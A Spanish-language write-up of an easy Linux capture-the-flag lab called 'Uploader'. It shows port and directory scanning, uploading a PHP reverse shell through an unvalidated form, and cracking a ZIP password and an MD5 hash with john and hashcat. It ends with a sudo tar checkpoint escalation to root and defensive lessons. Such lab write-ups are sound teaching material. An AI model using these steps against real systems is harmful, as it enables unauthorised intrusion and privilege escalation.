# Uploader

<img width="1351" height="639" alt="image" src="https://github.com/user-attachments/assets/b4b82415-76d3-4183-902b-5d56f5f2f6fc" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 23/07/2026

## 0. Resumen

Máquina Linux fácil que gira alrededor de un panel de subida de archivos sin validación real del lado del servidor

El camino de explotación combina:
- Bypass de un formulario de subida de archivos (arbitrary file upload) para lograr RCE
- Post-explotación: localización de un ZIP oculto con credenciales cifradas
- Cracking en dos capas (contraseña del ZIP + hash MD5 filtrado dentro del ZIP)
- Escalada a root abusando de una regla `sudo` mal configurada sobre `tar` (GTFOBins)

## 1. Reconocimiento

   Ping
   
```bash
ping -c 2 10.0.2.19
```

<img width="1222" height="129" alt="image" src="https://github.com/user-attachments/assets/25ed9a16-a218-475e-9261-4d07800761a5" />

→ TTL=64 sugiere que se trata de un host Linux

### Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA uploader
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

**Resultados:**
  
- Puerto 80: Apache 2.4.58, redirige a `Uploader file storage`

→ No hay SSH accesible desde el exterior en esta fase, así que todo el vector de entrada tiene que pasar por la web

## 2. Enumeración WEB

<img width="1886" height="454" alt="image" src="https://github.com/user-attachments/assets/84874a2e-0f5b-40a2-9801-8a4df8db5c89" />

Al acceder a la web nos encontramos con la landing page del "Uploader" y un enlace/botón que lleva a un panel de subida de archivos `upload.php`

### 2.1 Fuzzing de directorios

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

| Orden | Función |
|---|---|
| `-u` | URL |
| `-P` | Diccionario con contraseñas comunes |
| `-x` | Extensión de archivos |

<img width="1354" height="186" alt="image" src="https://github.com/user-attachments/assets/1cf159b7-2f67-41f6-8ba0-7d750c8b2213" />

Directorio relevante: `/uploads/`

→ Es donde el backend guarda todo lo que se sube desde `upload.php`. Esto es la primera señal de alarma: si el servidor no valida qué se sube y además lo deja accesible por HTTP, cualquier archivo ejecutable subido ahí se convierte en RCE

## 3. Explotación — Arbitrary File Upload

### 3.1 Prueba del formulario

El formulario de `upload.php` no filtra por extensión ni por tipo MIME real del archivo

Solo comprueba el `Content-Type` que manda el cliente, que se puede falsificar fácilmente

Esto permite subir directamente un archivo `.php`

### 3.2 Subida de la webshell

Empleando la reverse shell clásica de pentestmonkey:

```bash
curl -F "file=@revshell.php" http://<IP>/upload.php
```

El servidor confirma la subida. Inferimos por el patrón `/uploads/` la ruta donde ha quedado guardado el archivo, normalmente dentro de un subdirectorio con nombre aleatorio

En este caso `http://<IP>/uploads/cloud_8dd8e6/revshell.php`

### 3.3 Ejecución de comandos / reverse shell

Antes de ejecutar el archivo, ponemos el listener en el puerto 443

```bash
nc -lvnp 443
```

Y activamos la ejecución visitando la ruta de la shell subida para realizar la conexión a nuestra máquina

→ Recibimos la shell como el usuario de servicio web `www-data`

### 3.4 Mejorar la shell (TTY)

```bash
SHELL=/bin/bash script -q /dev/null

^Z

stty raw -echo && fg

reset

export TERM=xterm

export SHELL=/bin/bash

stty rows 38 columns 116
```

## 4. Post-explotación — Localizando el .ZIP

Enumerando `/home`, aparece un archivo `Readme.txt` y un directorio de otro usuario al que no tenemos acceso directo

El texto del Readme apunta directamente a la existencia de un archivo comprimido con posible material sensible

Buscamos ZIPs en todo el sistema

```bash
find / -type f -name "*.zip" 2>/dev/null
```

**Resultado:** `/srv/secret/File.zip`

Nos lo traemos a nuestra máquina atacante mediante python con `python3 -m http.server` desde la víctima y descargándolo con `wget`/`curl`

### 4.1 Intento de descompresión — error de compatibilidad

Al intentar descomprimirlo con `unzip` normal:

```bash
unzip File.zip
```

<img width="1210" height="62" alt="image" src="https://github.com/user-attachments/assets/fc5a5a42-5e91-4331-8c81-bd2179624a65" />

Esto ocurre porque el ZIP usa cifrado **AES** (especificación PKZIP 5.1+), que el `unzip` clásico de Info-ZIP no soporta (solo entiende hasta la 4.6, es decir, el cifrado ZipCrypto tradicional)

**Solución:** usar `7z`, que sí soporta AES:

```bash
sudo apt install p7zip-full

7z x File.zip
```

Al intentarlo, pide contraseña dado que el ZIP está protegido

## 5. Cracking — Doble capa

### 5.1 Contraseña del ZIP

```bash
zip2john File.zip > hash_zip.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt
```

<img width="1260" height="163" alt="image" src="https://github.com/user-attachments/assets/d427e290-d382-4d0b-8714-3a8fdf37c090" />

→ `john` recupera la contraseña del ZIP contra `rockyou.txt`. Con ella conseguimos extraer `Credentials/Credentials.txt`

### 5.2 Contraseña de usuario operatorx

Dentro de `Credentials.txt` no aparece una contraseña legible directamente, sino un hash asociado al usuario `operatorx`

<img width="1177" height="62" alt="image" src="https://github.com/user-attachments/assets/d1e913a2-585c-4065-b1f0-869345a01ed3" />

Probamos primero a identificarlo con `hash-identifier`, para una vez definido pasar a crackearlo con `hash-cat` o similar

<img width="1120" height="114" alt="image" src="https://github.com/user-attachments/assets/426bac51-b998-4c78-ae20-1d358103a9bd" />

```bash
hash-cat -m 0 operatorx_hash.txt /usr/share/wordlists/rockyou.txt 
```

<img width="1054" height="98" alt="image" src="https://github.com/user-attachments/assets/2d65aab6-2d16-4876-b46a-b24d883b64fc" />

Si `rockyou.txt` no lo resuelve, también se puede romper el hash con una base de datos de MD5 precomputados como `CrackStation`

→ Obtenemos la contraseña en texto plano `operatorx : 112233`

## 6. Movimiento lateral — su operatorx

```bash
su operatorx
```

Con las credenciales correctas, migramos al usuario `operatorx`

## 7. Escalada de privilegios — sudo + tar (GTFOBins)

### 7.1 Enumeración de privilegios

```bash
sudo -l
```

**Resultado:** `operatorx` puede ejecutar el binario `/usr/bin/tar` como `root` sin contraseña

### 7.2 Escalada a root

`tar` soporta la opción `--checkpoint-action`, que permite ejecutar un comando arbitrario durante el proceso de compresión/checkpoint

Al correr con privilegios de `sudo`, ese comando se ejecuta como `root`:

```bash
sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

→ Obtenemos una shell como `root`

### 7.3 Primera flag (operatorx)

```bash
cat /home/operatorx/user.txt
```

### 7.3 Segunda flag (root)

```bash
cat /root/root.txt
```

## 8. Lecciones aprendidas

<img width="1107" height="544" alt="image" src="https://github.com/user-attachments/assets/4de4a66c-1055-43ac-998a-e9d7cfc2993d" />


- **No confiar en la validación de subida de archivos:** Cualquier formulario de upload debe validar la extensión, el tipo MIME real (magic bytes) y, sobre todo, no debe permitir la ejecución de archivos subidos desde el propio directorio público

- Servir `/uploads/` con permisos de ejecución PHP es el fallo raíz de toda la cadena
  
- **Un ZIP protegido no es un control de seguridad robusto:** Sobretodo si la contraseña procede de un diccionario común (`rockyou.txt`) o si dentro se guardan hashes sin salt (MD5), que son crackeables casi instantáneamente
  
- **Auditar siempre las reglas de `sudo`** (`sudo -l`) tras cualquier acceso a un usuario intermedio:** Binarios legítimos como `tar`, `find`, `vim`, etc. pueden convertirse en una puerta directa a root si se permiten sin restricción de argumentos
